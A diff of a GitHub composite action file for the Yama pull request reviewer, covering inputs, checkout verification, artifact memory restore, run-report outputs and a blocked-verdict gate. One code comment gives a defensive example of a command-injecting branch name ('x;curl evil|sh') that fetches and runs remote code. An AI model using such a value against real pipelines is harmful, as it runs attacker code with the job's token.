@@ -1,324 +1,283 @@
-name: "Yama PR Review"
-description: "AI-powered PR review for GitHub with MCP tools"
-author: "Juspay Technologies"
+name: "Yama review"
+description: "Pull request review that reads the checked-out repository, posts what it finds, and learns on merge."
 
-branding:
-  icon: "shield"
-  color: "blue"
+# Two things this action depends on, both deliberate:
+#
+#  1. The repository must already be checked out. Yama reads the diff and the
+#     code from disk rather than through the VCS API — that is why a run needs
+#     tens of tool calls instead of hundreds.
+#  2. `fetch-depth: 0` (or at least enough history to reach the base) — the
+#     change set comes from `git diff base...head`.
 
 inputs:
-  github-token:
-    description: "GitHub token used by the GitHub MCP server for API access"
+  pr:
+    description: "Pull request number. Defaults to the triggering pull request."
     required: false
-    default: ${{ github.token }}
-  config-path:
-    description: "Path to the Yama config file"
+  branch:
+    description: "Branch to review. Yama resolves its pull request; ambiguity is reported, never guessed."
     required: false
+  config:
+    description: "Config directory. Point it outside the checkout when reviewing untrusted pull requests."
+    required: false
+    default: ".yama"
+  yama-version:
+    description: >
+      npm version range to install. Pinned to the major this action's inputs and
+      config shape belong to: installing "latest" would silently run an older
+      major against a v4 config, which fails in ways that look like a broken
+      review rather than a version mismatch.
+    required: false
+    default: "^4.0.0"
   dry-run:
-    description: "Run the review without posting comments or submitting the review"
+    description: "Analyse and report without posting anything."
     required: false
     default: "false"
-  ai-provider:
-    description: "AI provider to use (e.g. anthropic, openai, google-ai)"
+  concurrency:
+    description: "How much parallelism the agent may command: high | medium | low."
     required: false
-  ai-model:
-    description: "Model name for the selected AI provider"
-    required: false
-  explore-model:
-    description: "Smaller/faster model for the explore + verification subagents (defaults to ai-model)"
-    required: false
-  anthropic-api-key:
-    description: "Anthropic API key (used when ai-provider: anthropic)"
-    required: false
-  openai-api-key:
-    description: "OpenAI API key (used when ai-provider: openai)"
-    required: false
-  google-ai-api-key:
-    description: "Google AI Studio API key (used when ai-provider: google-ai)"
-    required: false
-  google-vertex-project:
-    description: "GCP project ID for Vertex AI (auto-derived from the credentials JSON when omitted)"
-    required: false
-  google-vertex-location:
-    description: "Vertex AI location/region"
-    required: false
-    default: "us-central1"
-  google-application-credentials:
-    description: "Vertex AI service-account credentials JSON content (written to a temp file at runtime)"
-    required: false
-  litellm-base-url:
-    description: "LiteLLM proxy base URL (used when ai-provider: litellm)"
-    required: false
-  litellm-api-key:
-    description: "LiteLLM proxy API key (used when ai-provider: litellm)"
-    required: false
-  focus-areas:
-    description: "Comma-separated focus areas for the review (e.g. security,performance)"
-    required: false
-  custom-prompt:
-    description: "Additional custom prompt instructions for the review"
-    required: false
-  verbose:
-    description: "Enable verbose logging"
-    required: false
-    default: "false"
-  skip-description-enhance:
-    description: "Run the review only and skip PR description enhancement"
-    required: false
-    default: "false"
-  fail-on-blocked:
-    description: "Fail the check when the review verdict is BLOCKED. Set to 'false' for advisory mode: the verdict summary comment and outputs are still produced, but the check stays green. Infrastructure failures always fail the check."
+    default: "medium"
+  verdict:
+    description: "Set false to review without an approve/block decision."
     required: false
     default: "true"
+  checks:
+    description: "Set false to skip configured checks for this run."
+    required: false
+    default: "true"
+  vcs-token:
+    description: >
+      Token for the VCS MCP server. Pass it through a NON-reserved env name —
+      ${{ secrets.GITHUB_TOKEN }} is unreliable inside a composite action.
+    required: false
+  fail-on-blocked:
+    description: "Exit non-zero when the verdict is BLOCKED."
+    required: false
+    default: "true"
+  node-version:
+    description: "Node version."
+    required: false
+    default: "22"
 
+# Every value here comes from the run report the CLI writes to
+# .yama/reports/<runId>.json, read by the "Publish the run report" step below.
+# They were previously bound to the review step, which writes nothing to
+# $GITHUB_OUTPUT — so all six were permanently empty and `fail-on-blocked` could
+# never fire, which made a blocked review indistinguishable from a clean one.
 outputs:
   decision:
-    description: "Review decision (APPROVED, CHANGES_REQUESTED, or BLOCKED)"
-    value: ${{ steps.review.outputs.decision }}
+    description: "APPROVED | CHANGES_REQUESTED | BLOCKED"
+    value: ${{ steps.report.outputs.decision }}
+  posted:
+    description: "Comments actually posted, counted from the posting tool's results."
+    value: ${{ steps.report.outputs.posted }}
+  critical:
+    description: "Critical findings posted."
+    value: ${{ steps.report.outputs.critical }}
+  major:
+    description: "Major findings posted."
+    value: ${{ steps.report.outputs.major }}
+  partial:
+    description: "True when a stage did not complete — the review cannot vouch for the whole change."
+    value: ${{ steps.report.outputs.partial }}
   summary:
-    description: "Review summary text"
-    value: ${{ steps.review.outputs.summary }}
-  findings:
-    description: "Markdown list of the findings behind the verdict (the reasons for a block)"
-    value: ${{ steps.review.outputs.findings }}
-  critical-issues:
-    description: "Number of critical issues found"
-    value: ${{ steps.review.outputs.critical-issues }}
-  major-issues:
-    description: "Number of major issues found"
-    value: ${{ steps.review.outputs.major-issues }}
-  minor-issues:
-    description: "Number of minor issues found"
-    value: ${{ steps.review.outputs.minor-issues }}
-  total-comments:
-    description: "Total number of inline comments posted by the review"
-    value: ${{ steps.review.outputs.total-comments }}
+    description: >
+      The verdict and the reasons behind it. The summary COMMENT body lives on
+      the pull request; the run report carries the decision and its reasons.
+    value: ${{ steps.report.outputs.summary }}
 
-# Composite action that runs the built Yama CLI (`node dist/cli/cli.js review`)
-# with the GitHub PR context wired through environment variables and CLI flags.
-#
-# Why composite instead of a bundled `node20`/`node24` JavaScript action:
-# The orchestrator depends on @juspay/neurolink, whose dependency tree has
-# proven hostile to static bundling with `ncc` (an earlier `undici` 5.x pin
-# failed outright on a missing `interceptors` export; the repo now pins
-# `undici` to ~7.22.0 via pnpm overrides). Marking such deps `--external`
-# would build but ship a runner missing them at runtime (bundled actions get
-# no `npm install`). A bundled action also runs on the runner's fixed Node
-# version, while NeuroLink's memory layer needs `node:sqlite` (see the
-# setup-node step below). Running the already-built CLI via a composite action
-# avoids the bundler entirely while preserving full review behavior and parity
-# with the CLI path.
 runs:
-  using: "composite"
+  using: composite
   steps:
-    # Pin pnpm to the version that generated pnpm-lock.yaml. Bare `corepack
-    # enable` picks an arbitrary pnpm whose `overrides` serialization differs
-    # from the lockfile (ERR_PNPM_LOCKFILE_CONFIG_MISMATCH on frozen install).
-    - name: Set up pnpm
-      uses: pnpm/action-setup@0ebf47130e4866e96fce0953f49152a61190b271 # v6.0.9
-      with:
-        version: 10.14.0
-
-    - name: Set up Node.js
-      uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7.0.0
-      with:
-        # Node 26: NeuroLink's memory layer requires the `node:sqlite` built-in,
-        # which does not exist on Node 20 and is flag-gated on Node 22
-        # (unflagged from Node 24; the Action runs Node 26, matching CI).
-        # actions/setup-node downloads and provisions this version on any
-        # runner, so it does not depend on the runner's pre-installed Node.
-        node-version: "26"
-
-    - name: Install dependencies and build CLI
+    - name: Verify the checkout
       shell: bash
-      working-directory: ${{ github.action_path }}
+      working-directory: ${{ github.workspace }}
       run: |
-        if [ ! -f "dist/cli/cli.js" ]; then
-          pnpm install --frozen-lockfile
-          pnpm run build
+        set -euo pipefail
+        if [ ! -d .git ]; then
+          echo "::error::Yama needs the repository checked out. Add actions/checkout@v4 with fetch-depth: 0 before this step."
+          exit 1
+        fi
+        # A shallow clone cannot reach the base commit, so the diff would be
+        # wrong rather than absent — which is worse. Say so loudly.
+        if [ "$(git rev-parse --is-shallow-repository)" = "true" ]; then
+          echo "::warning::This is a shallow clone. Yama needs history to compute the diff against the base. Use fetch-depth: 0."
         fi
 
-    - name: Run Yama review
+    - uses: actions/setup-node@v4
+      with:
+        node-version: ${{ inputs.node-version }}
+
+    - name: Restore this pull request's artifact
+      # Carries what earlier runs on this pull request established. Absent is
+      # fine — comment markers still carry deduplication.
+      #
+      # Located through the API rather than with `actions/download-artifact`:
+      # that action only sees artifacts from the CURRENT run, and the one needed
+      # here was written by the PREVIOUS review of this pull request. Using it
+      # restored nothing, silently, on every re-run.
+      continue-on-error: true
+      shell: bash
+      env:
+        GH_TOKEN: ${{ inputs.vcs-token }}
+        PR_NUMBER: ${{ inputs.pr || github.event.pull_request.number }}
+      run: |
+        set -euo pipefail
+        name="yama-pr-${PR_NUMBER}"
+        id=$(gh api "repos/${{ github.repository }}/actions/artifacts?per_page=100" \
+               --jq "[.artifacts[] | select(.name == \"$name\" and .expired == false)]
+                     | sort_by(.created_at) | reverse | .[0].id // empty")
+        if [ -z "$id" ]; then
+          echo "No previous memory for this pull request — reviewing from comment markers."
+          exit 0
+        fi
+        mkdir -p .yama/state
+        gh api "repos/${{ github.repository }}/actions/artifacts/$id/zip" > /tmp/yama-memory.zip
+        unzip -o -q /tmp/yama-memory.zip -d .yama/state
+        echo "Restored memory from artifact $id."
+
+    - name: Verify the setup
+      shell: bash
+      working-directory: ${{ github.workspace }}
+      env:
+        # Exported under both names on purpose. A capability map names the env
+        # var it interpolates, and the two conventions in the wild are
+        # ${YAMA_VCS_TOKEN} (provider-neutral) and ${YAMA_GITHUB_TOKEN} (what
+        # this repo's reference .yama/mcp.yaml and yama-review.yml use). Exporting
+        # one of them meant the other config style authenticated with an empty
+        # string and failed at the first API call.
+        YAMA_VCS_TOKEN: ${{ inputs.vcs-token }}
+        YAMA_GITHUB_TOKEN: ${{ inputs.vcs-token }}
+        YAMA_INPUT_DRY_RUN: ${{ inputs.dry-run }}
+        YAMA_INPUT_VERSION: ${{ inputs.yama-version }}
+      run: |
+        set -euo pipefail
+        # Everything expensive that can fail late is checked here instead:
+        # connections, credentials, and every capability the run will need.
+        DOCTOR_ARGS=(doctor)
+        if [ "$YAMA_INPUT_DRY_RUN" != "true" ]; then DOCTOR_ARGS+=(--live); fi
+        npx --yes "@juspay/yama@$YAMA_INPUT_VERSION" "${DOCTOR_ARGS[@]}"
+
+    - name: Review
       id: review
       shell: bash
       working-directory: ${{ github.workspace }}
       env:
-        # GitHub MCP server authenticates via the token. We forward it under a
-        # NON-RESERVED name (YAMA_GITHUB_TOKEN) as well as GITHUB_TOKEN: inside a
-        # composite action `GITHUB_TOKEN` is a reserved name whose value can be
-        # clobbered by the runner's automatic token, so `${YAMA_GITHUB_TOKEN}`
-        # (referenced by the MCP config) is the reliable one. GITHUB_TOKEN is
-        # kept for git operations / backward compatibility.
-        YAMA_GITHUB_TOKEN: ${{ inputs.github-token }}
-        GITHUB_TOKEN: ${{ inputs.github-token }}
-        # Surface AI provider/model selection to the orchestrator + NeuroLink.
-        # Yama's ConfigLoader reads AI_PROVIDER/AI_MODEL; NeuroLink's own provider
-        # factory keys off NEUROLINK_PROVIDER/NEUROLINK_MODEL (defaults to 'vertex'
-        # otherwise). Set both so provider selection is unambiguous — this mirrors
-        # the proven euler-api-dashboard Jenkins setup.
-        AI_PROVIDER: ${{ inputs.ai-provider }}
-        AI_MODEL: ${{ inputs.ai-model }}
-        NEUROLINK_PROVIDER: ${{ inputs.ai-provider }}
-        NEUROLINK_MODEL: ${{ inputs.ai-model }}
-        # The explore/bootstrap subagent should use the same provider/model as the
-        # main review (otherwise it falls back to a config default like vertex and
-        # fails when only one provider's credentials are present).
-        AI_EXPLORE_PROVIDER: ${{ inputs.ai-provider }}
-        AI_EXPLORE_MODEL: ${{ inputs.explore-model || inputs.ai-model }}
-        # AI provider credentials (pass the one matching ai-provider). Forwarded
-        # as env explicitly because step-level env does NOT propagate into a
-        # composite action's steps.
-        ANTHROPIC_API_KEY: ${{ inputs.anthropic-api-key }}
-        OPENAI_API_KEY: ${{ inputs.openai-api-key }}
-        GOOGLE_AI_API_KEY: ${{ inputs.google-ai-api-key }}
-        GOOGLE_VERTEX_PROJECT: ${{ inputs.google-vertex-project }}
-        GOOGLE_VERTEX_LOCATION: ${{ inputs.google-vertex-location }}
-        VERTEX_CREDENTIALS_JSON: ${{ inputs.google-application-credentials }}
-        # LiteLLM proxy (self-hosted / custom models). LITELLM_MODEL mirrors
-        # ai-model so NeuroLink's litellm provider resolves the right model.
-        LITELLM_BASE_URL: ${{ inputs.litellm-base-url }}
-        LITELLM_API_KEY: ${{ inputs.litellm-api-key }}
-        LITELLM_MODEL: ${{ inputs.ai-model }}
-        # GitHub PR context, consumed by ProviderDetector + the review request.
-        YAMA_ACTION_PATH: ${{ github.action_path }}
-        EVENT_PATH: ${{ github.event_path }}
-        REPO_OWNER: ${{ github.repository_owner }}
-        REPO_FULL: ${{ github.repository }}
-        CONFIG_PATH: ${{ inputs.config-path }}
-        FOCUS_AREAS: ${{ inputs.focus-areas }}
-        CUSTOM_PROMPT: ${{ inputs.custom-prompt }}
-        DRY_RUN: ${{ inputs.dry-run }}
-        VERBOSE: ${{ inputs.verbose }}
-        SKIP_DESC_ENHANCE: ${{ inputs.skip-description-enhance }}
+        # Both names — see the note on the previous step.
+        YAMA_VCS_TOKEN: ${{ inputs.vcs-token }}
+        YAMA_GITHUB_TOKEN: ${{ inputs.vcs-token }}
+        YAMA_CONCURRENCY: ${{ inputs.concurrency }}
+        YAMA_VERDICT: ${{ inputs.verdict }}
+        YAMA_CHECKS: ${{ inputs.checks }}
+        # Fork pull requests carry untrusted code. Check execution stays off for
+        # them regardless of configuration — but only if the process can tell.
+        # `isForkPullRequest` (src/v4/config/defaults.ts) decides by comparing the
+        # head repository against the base one, so those are the two names that
+        # have to arrive. GITHUB_HEAD_REPOSITORY is not a runner default and is
+        # empty for a non-pull-request event, which the comparison handles.
+        GITHUB_HEAD_REPOSITORY: ${{ github.event.pull_request.head.repo.full_name }}
+        GITHUB_REPOSITORY: ${{ github.repository }}
+        YAMA_INPUT_PR: ${{ inputs.pr }}
+        YAMA_INPUT_BRANCH: ${{ inputs.branch }}
+        YAMA_INPUT_DRY_RUN: ${{ inputs.dry-run }}
+        YAMA_INPUT_CONFIG: ${{ inputs.config }}
+        YAMA_INPUT_VERSION: ${{ inputs.yama-version }}
       run: |
         set -euo pipefail
+        # Inputs reach the shell ONLY through environment variables, never by
+        # template interpolation into this script. `inputs.branch` is routinely
+        # wired to `github.head_ref`, which a fork controls — a branch named
+        # `x;curl evil|sh` interpolated here would execute with the job's
+        # token before Yama ever starts.
+        ARGS=(review)
+        if [ -n "$YAMA_INPUT_PR" ]; then ARGS+=(--pr "$YAMA_INPUT_PR"); fi
+        if [ -n "$YAMA_INPUT_BRANCH" ]; then ARGS+=(--branch "$YAMA_INPUT_BRANCH"); fi
+        if [ "$YAMA_INPUT_DRY_RUN" = "true" ]; then ARGS+=(--dry-run); fi
+        ARGS+=(--config "$YAMA_INPUT_CONFIG")
+        npx --yes "@juspay/yama@$YAMA_INPUT_VERSION" "${ARGS[@]}"
 
-        # Resolve PR number from the event payload.
-        PR_NUMBER="$(node -e 'try{const e=require(process.env.EVENT_PATH);const n=(e.pull_request&&e.pull_request.number)||(e.issue&&e.issue.number);process.stdout.write(n?String(n):"")}catch(_){process.stdout.write("")}')"
-
-        if [ -z "$PR_NUMBER" ]; then
-          echo "::warning::Action triggered outside of a pull request context. Skipping review."
-          echo "decision=SKIPPED" >> "$GITHUB_OUTPUT"
-          echo "summary=Not a pull request event" >> "$GITHUB_OUTPUT"
-          echo "critical-issues=0" >> "$GITHUB_OUTPUT"
-          echo "major-issues=0" >> "$GITHUB_OUTPUT"
-          echo "minor-issues=0" >> "$GITHUB_OUTPUT"
-          echo "total-comments=0" >> "$GITHUB_OUTPUT"
-          echo "exit-code=0" >> "$GITHUB_OUTPUT"
-          exit 0
-        fi
-        echo "pr-number=$PR_NUMBER" >> "$GITHUB_OUTPUT"
-
-        OWNER="${REPO_FULL%%/*}"
-        REPO="${REPO_FULL#*/}"
-
-        # Vertex AI: materialize the service-account JSON to a temp file and
-        # point GOOGLE_APPLICATION_CREDENTIALS at it (NeuroLink uses ADC). The
-        # GCP project is derived from the JSON's project_id when not supplied.
-        if [ -n "${VERTEX_CREDENTIALS_JSON:-}" ]; then
-          CRED_FILE="$(mktemp "${RUNNER_TEMP:-/tmp}/vertex-creds-XXXXXX.json")"
-          # Delete the materialized service-account key when this step exits
-          # (success OR failure), so the credentials are never left on the runner.
-          trap 'rm -f "$CRED_FILE"' EXIT
-          # Write the secret from the environment via node — it is never passed
-          # as a shell/process argument, so it cannot appear in a process listing.
-          node -e 'require("fs").writeFileSync(process.argv[1], process.env.VERTEX_CREDENTIALS_JSON || "")' "$CRED_FILE"
-          chmod 600 "$CRED_FILE"
-          export GOOGLE_APPLICATION_CREDENTIALS="$CRED_FILE"
-          if [ -z "${GOOGLE_VERTEX_PROJECT:-}" ]; then
-            GOOGLE_VERTEX_PROJECT="$(node -e 'try{process.stdout.write(JSON.parse(require("fs").readFileSync(process.env.GOOGLE_APPLICATION_CREDENTIALS,"utf8")).project_id||"")}catch(_){process.stdout.write("")}')"
-            export GOOGLE_VERTEX_PROJECT
-            if [ -z "${GOOGLE_VERTEX_PROJECT}" ]; then
-              echo "::warning::Could not derive GOOGLE_VERTEX_PROJECT from the credentials JSON (missing or unreadable project_id). Pass the google-vertex-project input explicitly when using the Vertex provider."
-            fi
-          fi
-        fi
-
-        ARGS=(review --owner "$OWNER" --repo "$REPO" --pr "$PR_NUMBER")
-
-        [ -n "${CONFIG_PATH}" ] && ARGS+=(--config "$CONFIG_PATH")
-        [ -n "${FOCUS_AREAS}" ] && ARGS+=(--focus "$FOCUS_AREAS")
-        [ -n "${CUSTOM_PROMPT}" ] && ARGS+=(--prompt "$CUSTOM_PROMPT")
-        [ "${SKIP_DESC_ENHANCE}" = "true" ] && ARGS+=(--review-only)
-        [ "${DRY_RUN}" = "true" ] && ARGS+=(--dry-run)
-        [ "${VERBOSE}" = "true" ] && ARGS+=(--verbose)
-
-        echo "::group::Yama review (PR #$PR_NUMBER in $OWNER/$REPO)"
-        STATUS=0
-        node "$YAMA_ACTION_PATH/dist/cli/cli.js" "${ARGS[@]}" || STATUS=$?
-        echo "::endgroup::"
-
-        # Defer the pass/fail decision to the "Enforce verdict" step so the
-        # verdict summary comment is posted even when the check must fail.
-        echo "exit-code=$STATUS" >> "$GITHUB_OUTPUT"
-
-    # A blocking verdict must never be invisible. The agent posts inline
-    # comments itself, but when it fails to (or the findings lack detail) the
-    # check would otherwise go red with no explanation on the PR — so this
-    # deterministic step publishes the verdict + findings as one idempotent,
-    # marker-keyed comment whenever the review did not approve.
-    - name: Post verdict summary comment
-      if: ${{ !cancelled() && inputs.dry-run != 'true' && steps.review.outputs.pr-number != '' && (steps.review.outputs.decision == 'BLOCKED' || steps.review.outputs.decision == 'CHANGES_REQUESTED') }}
+    - name: Publish the run report
+      # The review writes .yama/reports/<runId>.json (writeRunReport, in
+      # src/v4/core/RunReport.ts) and nothing else to $GITHUB_OUTPUT — so this
+      # step is what turns a finished review into the action's outputs.
+      #
+      # `always()`: a review that failed part-way still wrote a report saying so,
+      # and a caller that gates on `partial` needs to see it. A missing or
+      # unreadable report yields empty outputs and a warning annotation, never a
+      # failed step — the review already happened either way.
+      id: report
+      if: always()
       shell: bash
-      env:
-        GH_TOKEN: ${{ inputs.github-token }}
-        REPO_FULL: ${{ github.repository }}
-        PR_NUMBER: ${{ steps.review.outputs.pr-number }}
-        DECISION: ${{ steps.review.outputs.decision }}
-        SUMMARY: ${{ steps.review.outputs.summary }}
-        FINDINGS: ${{ steps.review.outputs.findings }}
-        CRITICAL: ${{ steps.review.outputs.critical-issues }}
-        MAJOR: ${{ steps.review.outputs.major-issues }}
-        MINOR: ${{ steps.review.outputs.minor-issues }}
+      working-directory: ${{ github.workspace }}
       run: |
         set -euo pipefail
-        MARKER="<!-- yama-verdict-summary -->"
-        BODY_FILE="$(mktemp)"
-        {
-          echo "$MARKER"
-          echo "## 🛡️ Yama Review Verdict: $DECISION"
-          echo
-          echo "Severity counts — 🔒 CRITICAL: ${CRITICAL:-0} · ⚠️ MAJOR: ${MAJOR:-0} · 💡 MINOR: ${MINOR:-0}"
-          echo
-          if [ -n "${SUMMARY:-}" ]; then
-            printf '%s\n\n' "$SUMMARY"
-          fi
-          if [ -n "${FINDINGS:-}" ]; then
-            echo "### Findings behind this verdict"
-            printf '%s\n' "$FINDINGS"
-          else
-            echo "_The verdict reported findings but carried no detail — treat it as unverified and re-run the review or inspect manually._"
-          fi
-        } > "$BODY_FILE"
+        node -e '
+          const fs = require("node:fs");
+          const path = require("node:path");
+          const out = { decision: "", posted: "", critical: "", major: "", partial: "", summary: "" };
+          let report;
+          try {
+            const newest = fs
+              .readdirSync(path.join(process.cwd(), ".yama", "reports"))
+              .filter((name) => name.endsWith(".json"))
+              .map((name) => path.join(process.cwd(), ".yama", "reports", name))
+              .sort((a, b) => fs.statSync(b).mtimeMs - fs.statSync(a).mtimeMs)[0];
+            if (newest) {
+              report = JSON.parse(fs.readFileSync(newest, "utf8"));
+              console.log("Run report: " + newest);
+            } else {
+              console.log("::warning::No run report under .yama/reports; outputs stay empty.");
+            }
+          } catch (error) {
+            console.log("::warning::Could not read the run report: " + error.message);
+          }
+          if (report) {
+            const bySeverity = report.bySeverity || {};
+            const posted = Array.isArray(report.posted) ? report.posted.length : report.posted;
+            const verdict = report.verdict || {};
+            out.decision = report.decision || verdict.decision || "";
+            out.posted = String(typeof posted === "number" ? posted : 0);
+            out.critical = String(bySeverity.CRITICAL || 0);
+            out.major = String(bySeverity.MAJOR || 0);
+            out.partial = String(
+              typeof report.partial === "boolean"
+                ? report.partial
+                : Boolean(report.stages && report.stages.partial),
+            );
+            out.summary = [
+              "Verdict: " + (out.decision || "unknown"),
+              ...(verdict.reasons || []).map((reason) => "- " + reason),
+            ].join("\n");
+          }
+          try {
+            const file = process.env.GITHUB_OUTPUT;
+            const mark = "yama_eof_" + Math.random().toString(36).slice(2);
+            const body = Object.entries(out)
+              .map(([key, value]) => key + "<<" + mark + "\n" + value + "\n" + mark)
+              .join("\n");
+            if (file) { fs.appendFileSync(file, body + "\n"); }
+          } catch (error) {
+            console.log("::warning::Could not write step outputs: " + error.message);
+          }
+          console.log(
+            "decision=" + out.decision + " posted=" + out.posted +
+            " critical=" + out.critical + " major=" + out.major +
+            " partial=" + out.partial,
+          );
+        '
 
-        EXISTING_ID="$(gh api "repos/${REPO_FULL}/issues/${PR_NUMBER}/comments" --paginate \
-          --jq '.[] | select(.body | startswith("<!-- yama-verdict-summary -->")) | .id' 2>/dev/null | head -n1 || true)"
-        if [ -n "$EXISTING_ID" ]; then
-          gh api -X PATCH "repos/${REPO_FULL}/issues/comments/${EXISTING_ID}" -F body=@"$BODY_FILE" >/dev/null
-          echo "Updated existing verdict comment (id ${EXISTING_ID})."
-        else
-          gh api -X POST "repos/${REPO_FULL}/issues/${PR_NUMBER}/comments" -F body=@"$BODY_FILE" >/dev/null
-          echo "Posted verdict comment."
-        fi
+    - name: Save this pull request's artifact
+      if: always()
+      continue-on-error: true
+      uses: actions/upload-artifact@v4
+      with:
+        name: yama-pr-${{ inputs.pr || github.event.pull_request.number }}
+        path: .yama/state
+        retention-days: 30
+        overwrite: true
 
-    # Verdict-aware exit. Infrastructure failures (nonzero exit without a
-    # BLOCKED verdict) are always fatal. A BLOCKED verdict fails the check
-    # unless fail-on-blocked is 'false' (advisory mode: verdict comment and
-    # outputs only, check stays green).
-    - name: Enforce verdict
-      if: ${{ !cancelled() }}
+    - name: Fail on a blocked verdict
+      if: inputs.fail-on-blocked == 'true' && steps.report.outputs.decision == 'BLOCKED'
       shell: bash
-      env:
-        STATUS: ${{ steps.review.outputs.exit-code }}
-        DECISION: ${{ steps.review.outputs.decision }}
-        FAIL_ON_BLOCKED: ${{ inputs.fail-on-blocked }}
       run: |
-        STATUS="${STATUS:-0}"
-        if [ "$STATUS" = "0" ]; then
-          exit 0
-        fi
-        if [ "$DECISION" = "BLOCKED" ] && [ "$FAIL_ON_BLOCKED" = "false" ]; then
-          echo "::notice::Yama verdict is BLOCKED, but fail-on-blocked is 'false' — advisory mode, the check stays green. See the verdict summary comment on the PR for the reasons."
-          exit 0
-        fi
-        exit "$STATUS"
+        echo "::error::Yama blocked this pull request. See the summary comment for why."
+        exit 1
